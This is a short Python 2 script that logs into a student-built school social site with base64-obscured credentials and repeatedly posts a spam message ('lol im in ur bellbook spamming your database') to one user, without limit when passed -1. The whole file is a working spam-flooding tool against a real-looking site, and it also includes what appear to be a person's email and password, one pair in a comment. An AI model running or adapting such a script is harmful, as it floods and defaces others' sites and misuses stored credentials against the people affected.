#!/usr/bin/env python
import sys, urllib, urllib2, base64, cookielib
from BeautifulSoup import BeautifulSoup
class Voter:
    def __init__(self):
        self.root="http://greco.bcp.org/webs/students/1011/michaelC/bellbook/"
        self.cookies=cookielib.CookieJar()
        self.opener=urllib2.build_opener(urllib2.HTTPCookieProcessor(self.cookies))
        urllib2.install_opener(self.opener)
        self.authenticate()
        self.url=self.root+"postProc.php"
        self.params=urllib.urlencode({'post':'lol im in ur bellbook spamming your database',
				      'privacy':'private',
				      'toID':'37',
                                      'Submit':'Post'})
        self.votes=0
        self.handleErrors()

    def authenticate(self):
        url=self.root+'login.php'
        email=base64.b64decode("ZXJpYy5iYWthbjEyQGJjcC5vcmc=")
        password=base64.b64decode("WW1Wc2JHSnZiMnM9")[:-1]
        #email="eric.caldwell12@bcp.org"
        #password="lawlz"
        params=urllib.urlencode({'email':email,
                                 'password':password})
        return urllib2.urlopen(urllib2.Request(url,params)).read()
    
    def handleErrors(self):
        try:
            int(sys.argv[1])
        except ValueError:
            sys.argv.append('0')
        except IndexError:
            sys.argv.append('0')

    def vote(self):
        self.votes+=1
        return urllib2.urlopen(urllib2.Request(self.url+'?'+self.params)).read()

    def multivote(self,n,verbose=1):
        def proc():
            self.vote()
            if verbose: print "%d posts" % self.votes if self.votes!=1 else "1 post"

        if n==-1:
            while 1:
                proc()
        else:
            for i in range(n):
                proc()

    def voter(self):
        self.multivote(int(sys.argv[1]))

if __name__=='__main__':
    voter=Voter()
    voter.voter()
